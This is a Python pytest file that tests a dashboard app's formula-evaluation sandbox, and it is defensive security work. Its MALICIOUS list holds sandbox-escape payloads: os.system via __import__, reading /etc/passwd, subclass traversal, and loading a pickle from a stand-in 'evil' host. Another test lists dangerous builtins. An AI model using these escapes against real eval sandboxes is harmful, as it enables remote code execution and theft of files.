"""Security tests for the formula evaluation sandbox.

These tests pin the behaviour that protects users from malicious dashboard
templates: every user-/template-supplied formula must be unable to import
modules, reach dangerous builtins, or escape the eval namespace, while the
legitimate numeric formulas documented in the README keep working.
"""

import numpy as np
import pandas as pd
import pytest

from app.services.formula_safety import (
    SAFE_BUILTINS,
    UnsafeFormulaError,
    assert_formula_safe,
    assert_no_escape,
    safe_eval,
    safe_exec,
)


# --- payloads that must always be rejected --------------------------------

MALICIOUS = [
    "__import__('os').system('echo pwned')",
    "__import__('os')",
    "open('/etc/passwd').read()",
    "eval('1+1')",
    "exec('x = 1')",
    "compile('1', '<s>', 'eval')",
    "getattr(col, 'to_csv')('/tmp/x')",
    "globals()",
    "locals()",
    "().__class__.__bases__[0].__subclasses__()",
    "col['a'].__class__.__mro__",
    "pd.read_pickle('http://evil/x.pkl')",
    "pd.read_csv('/etc/passwd')",
    "np.load('/tmp/x.npy')",
    "__builtins__",
    "vars()",
]

# --- legitimate formulas (README + shipped example template) --------------

LEGIT_EXPRESSIONS = [
    "col['a'] + col['b']",
    "(col['Power_Output'] / (col['Fuel_Flow'] * 42000)) * 100",
    "col['Exhaust_Temp'].rolling(window=30).mean()",
    "col['Inlet_Flow'] - col['Outlet_Flow'] - col['Accumulation']",
    "np.where(col['Temp_Reactor'] > 420, 1, 0)",
    "(col['Timestamp'] - col['Timestamp'].iloc[0]).dt.total_seconds() / 3600",
    "np.median(col['a'])",
    "np.clip(col['a'], 0, 100)",
    "col['a'].diff().fillna(0)",
    "abs(col['a']) + np.sqrt(col['b'])",
]

LEGIT_STATEMENTS = [
    "result = col['a'] * 2",
    "result1 = col['a']\nresult2 = col['b']",
    # comment containing words like 'import' / 'input' / 'file' must NOT trip the gate
    "# Important: this is the input from a file/directory listing\nresult = col['a'] - col['b'] - 38",
    (
        "result1 = (col['Fuel_Gas_Consumed_tph'] * 47.0 + col['Power_MW'] * 3.6) / col['Ethylene_Product_tph']\n"
        "result2 = ((col['Fuel_Gas_Consumed_tph'] * 47.0 + col['Power_MW'] * 3.6) / col['Ethylene_Product_tph']).rolling(window=24).mean()"
    ),
]


@pytest.mark.parametrize("code", MALICIOUS)
def test_assert_formula_safe_rejects_malicious(code):
    with pytest.raises(UnsafeFormulaError):
        assert_formula_safe(code)


@pytest.mark.parametrize("code", LEGIT_EXPRESSIONS + LEGIT_STATEMENTS)
def test_assert_formula_safe_accepts_legitimate(code):
    assert_formula_safe(code)  # must not raise


def test_assert_formula_safe_rejects_empty():
    with pytest.raises(UnsafeFormulaError):
        assert_formula_safe("   ")


def test_safe_builtins_has_no_dangerous_entries():
    for forbidden in ("open", "__import__", "eval", "exec", "compile", "getattr", "input"):
        assert forbidden not in SAFE_BUILTINS


def test_safe_eval_computes_correct_result():
    df = pd.DataFrame({"a": [1.0, 2.0, 3.0], "b": [10.0, 20.0, 30.0]})
    out = safe_eval("col['a'] + col['b']", {"col": df, "np": np, "pd": pd})
    pd.testing.assert_series_equal(out, df["a"] + df["b"])


def test_safe_eval_blocks_rce():
    df = pd.DataFrame({"a": [1.0]})
    with pytest.raises(UnsafeFormulaError):
        safe_eval("__import__('os').system('echo pwned')", {"col": df, "np": np, "pd": pd})


def test_safe_eval_does_not_mutate_caller_namespace():
    df = pd.DataFrame({"a": [1.0]})
    ns = {"col": df, "np": np, "pd": pd}
    safe_eval("col['a'] * 2", ns)
    assert "__builtins__" not in ns


def test_safe_exec_runs_statement_and_extracts_results():
    df = pd.DataFrame({"a": [1.0, 2.0]})
    ns = {"col": df, "np": np, "pd": pd}
    safe_exec("result1 = col['a'] * 2\nresult2 = col['a'] + 1", ns)
    pd.testing.assert_series_equal(ns["result1"], df["a"] * 2, check_names=False)
    pd.testing.assert_series_equal(ns["result2"], df["a"] + 1, check_names=False)


def test_safe_exec_blocks_rce():
    ns = {"col": pd.DataFrame({"a": [1.0]}), "np": np, "pd": pd}
    with pytest.raises(UnsafeFormulaError):
        safe_exec("result = __import__('os').system('echo pwned')", ns)


def test_assert_no_escape_allows_regression_math_but_blocks_escape():
    # regression formulas use bare SAFE_MATH names with empty builtins
    assert_no_escape("a * exp(-b * x) + c")
    assert_no_escape("arctan(power(x, 2)) + a")
    with pytest.raises(UnsafeFormulaError):
        assert_no_escape("x.__class__.__bases__")
    with pytest.raises(UnsafeFormulaError):
        assert_no_escape("__import__('os')")


# --- integration: the actual render entry points ---------------------------

def test_compute_global_variables_blocks_malicious_formula():
    from app.models.schemas import GlobalVariable
    from app.services.visualization.processing import compute_global_variables

    df = pd.DataFrame({"a": [1.0, 2.0]})
    gvs = [GlobalVariable(name="evil", formula="__import__('os').system('echo pwned')")]
    with pytest.raises(ValueError):
        compute_global_variables(df, gvs)


def test_compute_global_variables_computes_legit_formula():
    from app.models.schemas import GlobalVariable
    from app.services.visualization.processing import compute_global_variables

    df = pd.DataFrame({"a": [1.0, 2.0], "b": [3.0, 4.0]})
    gvs = [GlobalVariable(name="total", formula="col['a'] + col['b']")]
    out = compute_global_variables(df, gvs)
    assert list(out["total"]) == [4.0, 6.0]


def test_template_save_rejects_unsafe_formula():
    from fastapi import HTTPException
    from app.api.templates import assert_template_formulas_safe
    from app.models.schemas import GlobalVariable, TemplateConfig, VisualizationConfig

    template = TemplateConfig(
        visualizations=[VisualizationConfig(id="v1", title="v1")],
        global_variables=[
            GlobalVariable(name="evil", formula="__import__('os').system('echo pwned')")
        ],
    )
    with pytest.raises(HTTPException) as exc:
        assert_template_formulas_safe(template)
    assert exc.value.status_code == 400


def test_template_save_accepts_safe_formula():
    from app.api.templates import assert_template_formulas_safe
    from app.models.schemas import GlobalVariable, TemplateConfig, VisualizationConfig

    template = TemplateConfig(
        visualizations=[VisualizationConfig(id="v1", title="v1")],
        global_variables=[GlobalVariable(name="total", formula="col['a'] + col['b']")],
    )
    assert_template_formulas_safe(template)  # must not raise
